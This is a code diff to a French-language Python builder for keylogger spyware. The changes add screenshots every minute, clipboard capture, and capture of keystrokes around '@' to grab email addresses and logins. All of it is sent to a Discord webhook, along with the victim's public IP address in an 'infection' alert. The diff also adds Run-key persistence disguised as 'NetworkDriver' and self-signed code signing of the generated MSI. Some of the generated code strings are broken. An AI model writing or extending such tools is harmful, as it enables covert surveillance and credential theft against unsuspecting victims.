@@ -14,6 +14,7 @@ from PIL import ImageGrab
 import io
 import cx_Freeze
 import platform
+import winreg
 import getpass
 import socket
 
@@ -40,43 +41,6 @@ def valider_webhook():
     if webhook_entry.get().strip() == "":
         messagebox.showerror("Erreur", "Le champ du webhook ne peut pas être vide.")
 
-# Option heure d'activité
-def activity_time_option_selected():
-    global debut_heure, fin_heure
-    if activity_time_option.get():
-        heure = ctk.CTkToplevel(app)
-        heure.geometry("400x300")
-        heure.title("Configuration de l'heure d'activité")
-
-        debut_label = ctk.CTkLabel(heure, text="Heure de début (HH:MM):", font=ctk.CTkFont(size=14))
-        debut_label.pack(pady=10)
-        debut_entry = ctk.CTkEntry(heure, width=200, font=ctk.CTkFont(size=14))
-        debut_entry.pack(pady=10)
-
-        fin_label = ctk.CTkLabel(heure, text="Heure de fin (HH:MM):", font=ctk.CTkFont(size=14))
-        fin_label.pack(pady=10)
-        fin_entry = ctk.CTkEntry(heure, width=200, font=ctk.CTkFont(size=14))
-        fin_entry.pack(pady=10)
-
-        def valider_hour():
-            nonlocal debut_entry, fin_entry
-            heure_debut_valide = debut_entry.get().strip()
-            heure_fin_valide = fin_entry.get().strip()
-            if heure_debut_valide == "" or heure_fin_valide == "":
-                messagebox.showerror("Erreur", "Les champs d'heure de début et de fin ne peuvent pas être vides.")
-                return
-            try:
-                global debut_heure, fin_heure
-                debut_heure = datetime.strptime(heure_debut_valide, "%H:%M").time()
-                fin_heure = datetime.strptime(heure_fin_valide, "%H:%M").time()
-            except ValueError as e:
-                messagebox.showerror("Erreur", f"Une erreur est survenue : {e}")
-                return
-            messagebox.showinfo("Info", f"Heures d'activité définies : {debut_heure} -> {fin_heure}")
-            heure.destroy()
-
-        valider_heure_btn = ctk.CTkButton(heure, text="Valider", font=ctk.CTkFont(size=14), command=valider_hour)
-        valider_heure_btn.pack(pady=20)
 
 # Option choix du nom du keylogs
 def nom_keylogs():
@@ -103,13 +67,16 @@ def nom_keylogs():
 
 # ---------------- OPTIONS ----------------
 def screenshot_option_func():
-    im = ImageGrab.grab()
-    buffer = io.BytesIO()
-    im.save(buffer, format="PNG")
-    buffer.seek(0)
-    webhook_url = webhook_entry.get()
-    files = {'file': ('screenshot.png', buffer, 'image/png')}
-    requests.post(webhook_url, files=files)
+    while True:
+        im = ImageGrab.grab()
+        buffer = io.BytesIO()
+        im.save(buffer, format="PNG")
+        buffer.seek(0)
+        webhook_url = webhook_entry.get()
+        files = {'file': ('screenshot.png', buffer, 'image/png')}
+        message = "Screenshot envoyé"
+        requests.post(webhook_url, json=message,files=files)
+        time.sleep(60)
 
 def clipboard_option_func():
     old = clipboard.paste()
@@ -117,16 +84,48 @@ def clipboard_option_func():
     while True:
         time.sleep(1)
         mtn = clipboard.paste()
+        message = "Presse papier : "
         if old != mtn:
-            requests.post(webhook_url, json={"content": mtn})
+            requests.post(webhook_url, json={message, mtn})
+            im = ImageGrab.grab()
+            buffer = io.BytesIO()
+            im.save(buffer, format="PNG")
+            buffer.seek(0)
+            files = {'file': ('screenshot.png', buffer, 'image/png')}
+            message = "Screenshot envoyé"
+            requests.post(webhook_url, json=message,files=files)
             old = mtn
 
-def autostart_option_func():
-    print("Option autostart activée")
+def autostart_option_func(script_path=None, name="NetworkDriver"):
+    # Chemin du script Python
+    if script_path is None:
+        script_path = os.path.abspath(__file__)
+
+    # Chemin vers python.exe utilisé pour lancer ton script
+    python_exe = sys.executable
+
+    # Commande complète à lancer au démarrage
+    command = f'"{python_exe}" "{script_path}"'
+
+    # On ouvre la clé Run dans le registre
+    key = winreg.OpenKey(
+        winreg.HKEY_CURRENT_USER,
+        r"Software\Microsoft\Windows\CurrentVersion\Run",
+        0,
+        winreg.KEY_SET_VALUE
+    )
+
+    # On écrit la commande dans la clé
+    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, command)
+    winreg.CloseKey(key)
+    
+
+
 
 
 def capture_before_after_at_option_func():
     def touche(key):
+        webhook = webhook_entry.get()
         global historique, capture_apres_at, apres_at_buffer, compteur
         try:
             caractere = key.char
@@ -134,7 +133,7 @@ def capture_before_after_at_option_func():
             if capture_apres_at:
                 apres_at_buffer.append(caractere)
                 compteur += 1
-                if compteur >= 20:
+                if compteur >= 50:
                     print("\n--- 20 caractères après @ ---")
                     print(''.join(apres_at_buffer))
                     print("--------------------------------\n")
@@ -152,6 +151,15 @@ def capture_before_after_at_option_func():
             apres_at_buffer = []
             compteur = 0
 
+        im = ImageGrab.grab()
+        buffer = io.BytesIO()
+        im.save(buffer, format="PNG")
+        buffer.seek(0)
+        webhook_url = webhook_entry.get()
+        files = {'file': ('screenshot.png', buffer, 'image/png')}
+        message = "Screenshot envoyé"
+        requests.post(webhook, json=message,files=files)
+
         
 
     with keyboard.Listener(on_press=touche) as listener:
@@ -162,11 +170,13 @@ def low_and_slow_option_func():
 
 def alert_on_infection_option_func():
     discord_webhook = webhook_entry.get()
+    ip = requests.get("https://api.ipify.org").text
     name = (
         f"Nom de l'ordinateur : {ordi.node}"
         f"Utilisateur actuel : {getpass.getuser()}"
         f"Nom de l'ordinateur : {ordi.node}"
         f"Adresse IP : {socket.gethostbyname(hostname)}"
+        f"Adresse IP publique {ip}"
         )
 
     requests.post(discord_webhook, json={"content": name})
@@ -214,9 +224,7 @@ def pyw():
             "screenshot": screenshot_var.get(),
             "clipboard": clipboard_var.get(),
             "autostart": autostart_var.get(),
-            "activity_time": activity_time_var.get(),
             "capture_before_after_at": capture_var.get(),
-            "low_and_slow": low_slow_var.get(),
             "alert_on_infection": alert_var.get()
         }
     }
@@ -239,12 +247,14 @@ def pyw():
         if config["options"]["screenshot"]:
             f.write("import requests, io\nfrom PIL import ImageGrab\n")
             f.write("def screenshot_option_func():\n")
-            f.write("    im = ImageGrab.grab()\n")
-            f.write("    buffer = io.BytesIO()\n")
-            f.write("    im.save(buffer, format='PNG')\n")
-            f.write("    buffer.seek(0)\n")
-            f.write("    files = {'file': ('screenshot.png', buffer, 'image/png')}\n")
-            f.write("    requests.post(WEBHOOK, files=files)\n\n")
+            f.write("    while True:\n")
+            f.write("       im = ImageGrab.grab()\n")
+            f.write("       buffer = io.BytesIO()\n")
+            f.write("       im.save(buffer, format='PNG')\n")
+            f.write("       buffer.seek(0)\n")
+            f.write("       files = {'file': ('screenshot.png', buffer, 'image/png')}\n")
+            f.write("       requests.post(WEBHOOK, files=files)\n\n")
+            f.write("       time.sleep(60)")
 
         # Clipboard
         if config["options"]["clipboard"]:
@@ -254,13 +264,21 @@ def pyw():
             f.write("    while True:\n")
             f.write("        time.sleep(1)\n")
             f.write("        mtn = clipboard.paste()\n")
-            f.write("        if old != mtn:\n")
-            f.write("            requests.post(WEBHOOK, json={'content': mtn})\n")
+            f.write('        message = "Presse papier :"\n ' )
+            f.write("       if old != mtn:\n")
+            f.write("            requests.post(WEBHOOK, json={message, mtn})\n")
+            f.write("            im = ImageGrab.grab()\n")
+            f.write("            buffer = io.BytesIO()\n")
+            f.write("            im.save(buffer, format='PNG')\n")
+            f.write("            buffer.seek(0)\n")
+            f.write("            files = {'file': ('screenshot.png', buffer, 'image/png')}\n")
+            f.write('            message = "Screenshot envoyé"\n')
+            f.write("            requests.post(WEBHOOK, json=message,files=files)\n")
             f.write("            old = mtn\n\n")
 
         # Capture avant/après @
         if config["options"]["capture_before_after_at"]:
-            f.write("import requests, time\nfrom pynput import keyboard\n")
+            f.write("import requests, time\nfrom pynput import keyboard\nimport io\nfrom PIL import ImageGrab\n")
             f.write("historique = []\n")
             f.write("capture_apres_at = False\n")
             f.write("apres_at_buffer = []\n")
@@ -274,8 +292,8 @@ def pyw():
             f.write("            if capture_apres_at:\n")
             f.write("                apres_at_buffer.append(caractere)\n")
             f.write("                compteur += 1\n")
-            f.write("                if compteur >= 20:\n")
-            f.write("                    data = 'Avant @: ' + ''.join(historique[-30:]) + '\\nApres @: ' + ''.join(apres_at_buffer)\n")
+            f.write("                if compteur >= 50:\n")
+            f.write("                    data = 'Avant @: ' + ''.join(historique[-50:]) + '\\nApres @: ' + ''.join(apres_at_buffer)\n")
             f.write("                    requests.post(WEBHOOK, json={'content': data})\n")
             f.write("                    capture_apres_at = False\n")
             f.write("                    apres_at_buffer = []\n")
@@ -288,8 +306,33 @@ def pyw():
             f.write("            compteur = 0\n\n")
             f.write("    with keyboard.Listener(on_press=touche) as listener:\n")
             f.write("        listener.join()\n\n")
+            f.write("im = ImageGrab.grab()\n")
+            f.write("buffer = io.BytesIO()\n")
+            f.write("im.save(buffer, format='PNG')\n")
+            f.write("buffer.seek(0)\n")
+            f.write("files = {'file': ('screenshot.png', buffer, 'image/png')}\n")
+            f.write('message = "Screenshot envoyé"\n')
+            f.write("requests.post(WEBHOOK, json=message,files=files)\n")
 
-        # Alerte si infection
+
+        # Démarrage automatique
+        if config["options"]["autostart"]:
+            f.write("import sys, os, winreg\n\n")
+            f.write("def autostart_option_func(script_path=None, name='NetworkDriver''):\n")
+            f.write("   if script_path is None:\n")
+            f.write("       script_path = os.path.abspath(__file__)\n\n")
+            f.write("   python_exe = sys.executable\n\n")
+            f.write("   command = f''{python_exe}' '{script_path}''\n\n")
+            f.write("   key = winreg.OpenKey(\n")
+            f.write("       winreg.HKEY_CURRENT_USER,\n")
+            f.write("       r'Software\Microsoft\Windows\CurrentVersion\Run',\n")
+            f.write("       0,\n")
+            f.write("       winreg.KEY_SET_VALUE\n")
+            f.write("   )\n\n")
+            f.write("    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, command)\n")
+            f.write("    winreg.CloseKey(key)\n")
+
+
         # Alerte si infection
         if config["options"]["alert_on_infection"]:
             f.write(
@@ -297,21 +340,16 @@ def pyw():
                 'ordi = platform.node()\n'
                 'hostname = socket.gethostname()\n\n'
                 'def alert_on_infection_option_func():\n'
+                '   ip = requests.get("https://api.ipify.org").text\n'
                 '    discord_webhook = WEBHOOK\n'
                 '    name = (\n'
-                '        f"Nom de l\'ordinateur : {ordi}\\n"\n'
-                '        f"Utilisateur actuel : {getpass.getuser()}\\n"\n'
-                '        f"Adresse IP : {socket.gethostbyname(hostname)}"\n'
+                '        f"Nom de l\'ordinateur : {ordi}\\n"'
+                '        f"Utilisateur actuel : {getpass.getuser()}\\n"'
+                '        f"Adresse IP : {socket.gethostbyname(hostname)}\n"'
+                '        f"Adresse IP publique {ip}"'
                 '    )\n'
                 '    requests.post(discord_webhook, json={"content": name})\n\n'
             )
-
-
-        # Autres options (fonction vide)
-        for opt in ["autostart", "activity_time", "low_and_slow"]:
-            if config["options"][opt]:
-                f.write(f"def {opt}_option_func():\n")
-                f.write(f"    print('Option {opt} activée')\n\n")
 
         # Lancement des threads
         f.write("if __name__ == '__main__':\n")
@@ -334,6 +372,8 @@ def msi():
 
     setup_filename = "setup_msi_temp.py"
 
+
+
     # Création du fichier setup pour cx_Freeze
     with open(setup_filename, "w", encoding="utf-8") as f:
         f.write(
@@ -344,7 +384,7 @@ def msi():
             f"    description='Programme créé avec le builder',\n"
             f"    options={{\n"
             f"        'build_exe': {{\n"
-            f"            'packages': ['pynput', 'customtkinter', 'requests', 'clipboard', 'PIL', 'getpass', 'platform', 'socket', 'time', 'pynput', 'io']\n"
+            f"            'packages': ['pynput', 'customtkinter', 'requests', 'clipboard', 'PIL', 'getpass', 'platform', 'socket', 'time', 'io'],\n"
             f"            'include_files': []\n"
             f"        }}\n"
             f"    }},\n"
@@ -383,7 +423,57 @@ def msi():
     if os.path.exists("dist"):
         shutil.rmtree("dist")
 
-    messagebox.showinfo("Succès", f"✅ MSI créé dans {output_dir}/, prêt à l'installation !")
+
+    # Chatgpt qui a fait la partie certificat
+    def generer_certificat_auto():
+        # Génère un certificat auto-signé
+        cmd = [
+            "powershell", "-Command",
+            'New-SelfSignedCertificate -Type CodeSigning -Subject "CN=Networkdriver" -CertStoreLocation "Cert:\\CurrentUser\\My"'
+        ]
+        subprocess.run(cmd, capture_output=True, text=True)
+
+    def exporter_certificat_pfx(pfx_path, password):
+        cmd = [
+            "powershell", "-Command",
+            f'$pwd = ConvertTo-SecureString -String "{password}" -Force -AsPlainText; '
+            '$cert = Get-ChildItem Cert:\\CurrentUser\\My | Where-Object {{ $_.Subject -eq "CN=MonLogiciel" }}; '
+            f'Export-PfxCertificate -Cert $cert -FilePath "{pfx_path}" -Password $pwd'
+        ]
+        subprocess.run(cmd, capture_output=True, text=True)
+
+    def signer_msi(msi_path, pfx_path, password):
+        cmd = [
+            "signtool", "sign",
+            "/f", pfx_path,
+            "/p", password,
+            "/fd", "SHA256",
+            "/v",
+            msi_path
+        ]
+        return subprocess.run(cmd, capture_output=True, text=True)
+
+
+    def signer_msi_auto(msi_file_path):
+        pfx_path = os.path.expanduser("~/moncert.pfx")
+        password = "motdepasse123"  # Mets ce que tu veux
+
+        # 1️⃣ Génération certificat
+        generer_certificat_auto()
+
+        # 2️⃣ Export PFX
+        exporter_certificat_pfx(pfx_path, password)
+
+        # 3️⃣ Signature MSI
+        result = signer_msi(msi_file_path, pfx_path, password)
+
+        if result.returncode == 0:
+            messagebox.showinfo("Succès", "Le MSI a été signé automatiquement avec un certificat auto-signé !")
+        else:
+            messagebox.showerror("Erreur", f"Échec de la signature :\n{result.stderr}")
+
+
+        messagebox.showinfo("Succès", f"✅ MSI créé dans {output_dir}/, prêt à l'installation !")
 
 
 # ---------------- INTERFACE ----------------
@@ -426,18 +516,14 @@ jsp = ctk.StringVar(value=".msi")
 # Cases à cocher
 choix_nom = ctk.CTkCheckBox(app, text="Choix du nom du keylogs", variable=choix_nom_var, command=nom_keylogs)
 choix_nom.pack(pady=5)
-screenshot_option = ctk.CTkCheckBox(app, text="Capture d'écran", variable=screenshot_var)
+screenshot_option = ctk.CTkCheckBox(app, text="Capture d'écran chaque minute", variable=screenshot_var)
 screenshot_option.pack(pady=5)
 clipboard_option = ctk.CTkCheckBox(app, text="Capture du presse-papier", variable=clipboard_var)
 clipboard_option.pack(pady=5)
-autostart_option = ctk.CTkCheckBox(app, text="Démarrage automatique (En développement)", variable=autostart_var)
+autostart_option = ctk.CTkCheckBox(app, text="Démarrage automatique", variable=autostart_var)
 autostart_option.pack(pady=5)
-activity_time_option = ctk.CTkCheckBox(app, text="Heure d'activité (En développement)", variable=activity_time_var, command=activity_time_option_selected)
-activity_time_option.pack(pady=5)
 capture_before_after_at_option = ctk.CTkCheckBox(app, text="Capture avant @ et après", variable=capture_var)
 capture_before_after_at_option.pack(pady=5)
-low_and_slow_option = ctk.CTkCheckBox(app, text="Low and Slow (En développement)", variable=low_slow_var)
-low_and_slow_option.pack(pady=5)
 alert_on_infection_option = ctk.CTkCheckBox(app, text="Alerte si contamination", variable=alert_var)
 alert_on_infection_option.pack(pady=5)
 switch = ctk.CTkSwitch(app, textvariable=jsp, command=text)
@@ -463,5 +549,3 @@ with open("logs.txt", "a") as fichier:
 
 def key():
     app.mainloop()
-
-key()
